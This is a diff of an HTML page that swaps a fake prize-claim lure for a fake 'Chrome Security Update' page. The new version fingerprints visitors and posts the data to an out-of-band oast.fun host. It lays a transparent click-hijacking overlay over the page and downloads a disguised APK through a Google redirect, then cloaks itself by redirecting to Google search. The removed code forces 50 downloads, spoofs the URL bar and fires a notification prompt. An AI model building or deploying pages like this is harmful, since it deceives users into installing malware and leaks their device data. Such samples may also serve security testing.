@@ -1,54 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Congratulations! You won 🎁</title>
+  <title>Chrome Security Update</title>
   <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 100px; }
-    #claim-btn {
-      background: gold; color: black; padding: 20px 40px; font-size: 22px;
-      border: none; border-radius: 8px; cursor: pointer;
+    body { font-family: sans-serif; padding: 40px; text-align: center; }
+    #update-btn {
+      background: #4CAF50;
+      color: white;
+      font-size: 20px;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      position: relative;
+      z-index: 9999;
+    }
+    .overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: transparent;
+      z-index: 10000;
     }
   </style>
 </head>
 <body>
-  <h1>🎉 CLAIM YOUR REWARD</h1>
-  <p>Click below to confirm & download your gift.</p>
-  <button id="claim-btn">CLAIM NOW</button>
+
+  <h2>🔒 Chrome Update Required</h2>
+  <p>Your system may be at risk. Please click "Update Now" to install the latest security patch.</p>
+  <button id="update-btn">Update Now</button>
 
   <script>
-    const claimBtn = document.getElementById('claim-btn');
+    // === 1. Fingerprint
+    const fp = {
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      screen: screen.width + "x" + screen.height,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
 
-    claimBtn.addEventListener('click', () => {
-      // 1. Spoof URL bar (optional deception)
-      history.replaceState({}, '', '/secure-confirmation');
-
-      // 2. Perform 50 download using the same user gesture
-      for (let i = 1; i <= 50; i++) {
-        const a = document.createElement('a');
-        a.href = `data:text/html,You downloaded file ${i}`;
-        a.download = `Voucher_${i}.html`; // spoof as pdf if needed
-        document.body.appendChild(a);
-        a.click();
-      }
-
-      // 3. Trigger Notification Prompt Deception
-      setTimeout(() => {
-        Notification.requestPermission().then(permission => {
-          fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/bulk-download-deception', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              permission, ts: Date.now(), ua: navigator.userAgent
-            })
-          });
-        });
-      }, 500);
-
-      // 4. Cloaking after download
-      setTimeout(() => {
-        location.href = "https://www.google.com/search?q=congrats+reward";
-      }, 2500);
+    fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/fingerprint", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(fp)
     });
+
+    // === 2. Click Hijack Overlay
+    const overlay = document.createElement("div");
+    overlay.className = "overlay";
+    overlay.onclick = function () {
+      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/clicked", {
+        method: "POST",
+        body: JSON.stringify({ clicked: true, ts: Date.now() }),
+        headers: { "Content-Type": "application/json" }
+      });
+
+      // 3. Trigger download via Google redirect cloak
+      const a = document.createElement("a");
+      a.href = "https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D";
+      a.download = "ChromeSecurityUpdate.apk";
+      document.body.appendChild(a);
+      a.click();
+
+      // 4. Cloaking redirect
+      setTimeout(() => {
+        location.href = "https://www.google.com/search?q=chrome+update";
+      }, 1000);
+    };
+
+    document.body.appendChild(overlay);
   </script>
 </body>
 </html>
